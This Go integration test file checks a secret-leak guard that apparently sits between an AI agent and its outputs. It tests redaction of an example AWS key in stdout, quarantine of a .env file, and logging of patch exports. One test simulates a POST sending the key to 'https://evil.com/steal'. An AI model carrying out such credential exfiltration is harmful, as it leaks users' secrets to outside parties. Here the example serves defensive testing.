package integration

import (
	"bytes"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/kamilrybacki/muselet/internal"
	"github.com/kamilrybacki/muselet/internal/agent"
	"github.com/kamilrybacki/muselet/internal/policy"
	"github.com/kamilrybacki/muselet/internal/sidecar"
)

func setupAgentSidecar(t *testing.T, pol *policy.Policy) (
	*agent.Agent, *sidecar.Sidecar, *bytes.Buffer, func()) {
	t.Helper()

	dir := t.TempDir()
	sockPath := filepath.Join(dir, "muselet.sock")

	if pol == nil {
		pol = policy.DefaultPolicy()
	}

	s, err := sidecar.NewSidecar(sidecar.Config{
		SocketPath: sockPath,
		AuditLog:   io.Discard,
	}, pol, "test-session")
	if err != nil {
		t.Fatalf("new sidecar: %v", err)
	}

	go s.Run()
	time.Sleep(20 * time.Millisecond)

	var stdout bytes.Buffer
	a, err := agent.NewAgent(sockPath, &stdout)
	if err != nil {
		s.Stop()
		t.Fatalf("new agent: %v", err)
	}

	cleanup := func() {
		a.Close()
		s.Stop()
	}

	return a, s, &stdout, cleanup
}

func TestAgentSidecarCleanStdout(t *testing.T) {
	a, _, stdout, cleanup := setupAgentSidecar(t, nil)
	defer cleanup()

	a.ProcessStdout([]byte("Hello, this is normal output\n"))
	time.Sleep(50 * time.Millisecond)

	if !strings.Contains(stdout.String(), "Hello, this is normal output") {
		t.Error("clean stdout should pass through")
	}
}

func TestAgentSidecarSecretInStdout(t *testing.T) {
	a, _, stdout, cleanup := setupAgentSidecar(t, nil)
	defer cleanup()

	a.ProcessStdout([]byte("key=AKIAIOSFODNN7EXAMPLE\n"))
	time.Sleep(50 * time.Millisecond)

	output := stdout.String()
	if strings.Contains(output, "AKIAIOSFODNN7EXAMPLE") {
		t.Error("secret should have been redacted from stdout")
	}
	if !strings.Contains(output, "[REDACTED") {
		t.Error("should contain redaction marker")
	}
}

func TestAgentSidecarFSQuarantine(t *testing.T) {
	workDir := t.TempDir()
	dir := t.TempDir()
	sockPath := filepath.Join(dir, "muselet.sock")

	pol := policy.DefaultPolicy()
	s, err := sidecar.NewSidecar(sidecar.Config{
		SocketPath: sockPath,
		AuditLog:   io.Discard,
	}, pol, "test-session")
	if err != nil {
		t.Fatalf("new sidecar: %v", err)
	}
	go s.Run()
	defer s.Stop()
	time.Sleep(20 * time.Millisecond)

	a, err := agent.NewAgent(sockPath, io.Discard, agent.WithWatchDir(workDir))
	if err != nil {
		t.Fatalf("new agent: %v", err)
	}
	defer a.Close()

	// Write a file containing a secret directly through the agent
	envPath := filepath.Join(workDir, ".env")
	os.WriteFile(envPath, []byte("AWS_SECRET=AKIAIOSFODNN7EXAMPLE"), 0644)
	a.ProcessFSWrite(envPath, []byte("AWS_SECRET=AKIAIOSFODNN7EXAMPLE"))

	time.Sleep(100 * time.Millisecond)

	// File should be quarantined
	if _, err := os.Stat(envPath + ".muselet-quarantine"); err != nil {
		t.Error("file should have been quarantined")
	}
}

func TestAgentSidecarLearningMode(t *testing.T) {
	pol := policy.DefaultPolicy()
	pol.LearningMode = true

	a, s, stdout, cleanup := setupAgentSidecar(t, pol)
	defer cleanup()

	// In learning mode, even secrets should pass through
	a.ProcessStdout([]byte("this has AKIAIOSFODNN7EXAMPLE in it\n"))
	time.Sleep(50 * time.Millisecond)

	// Note: hot path in agent still blocks regardless of learning mode
	// But the sidecar's verdict would be "allow" in learning mode
	_ = stdout
	_ = s

	summary := s.AuditSummary()
	// Events should be logged
	if summary.TotalEvents == 0 {
		t.Error("should have logged events in learning mode")
	}
}

func TestAgentSidecarNetworkEvent(t *testing.T) {
	a, s, _, cleanup := setupAgentSidecar(t, nil)
	defer cleanup()

	a.ProcessNetworkRequest(internal.HTTPRequest{
		Method: "POST",
		URL:    "https://evil.com/steal",
		Host:   "evil.com",
		Body:   []byte("key=AKIAIOSFODNN7EXAMPLE"),
	})

	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have logged network event")
	}
}

func TestAgentSidecarPatchExport(t *testing.T) {
	a, s, _, cleanup := setupAgentSidecar(t, nil)
	defer cleanup()

	patch := []byte(`diff --git a/main.go b/main.go
+var key = "AKIAIOSFODNN7EXAMPLE"
`)
	a.ProcessPatchExport(patch)
	time.Sleep(100 * time.Millisecond)

	summary := s.AuditSummary()
	if summary.TotalEvents == 0 {
		t.Error("should have logged patch event")
	}
}

func TestAgentStats(t *testing.T) {
	a, _, _, cleanup := setupAgentSidecar(t, nil)
	defer cleanup()

	for i := 0; i < 10; i++ {
		a.ProcessStdout([]byte("line\n"))
	}

	time.Sleep(100 * time.Millisecond)

	stats := a.GetStats()
	if stats.EventsTotal < 10 {
		t.Errorf("events total: want >= 10, got %d", stats.EventsTotal)
	}
}
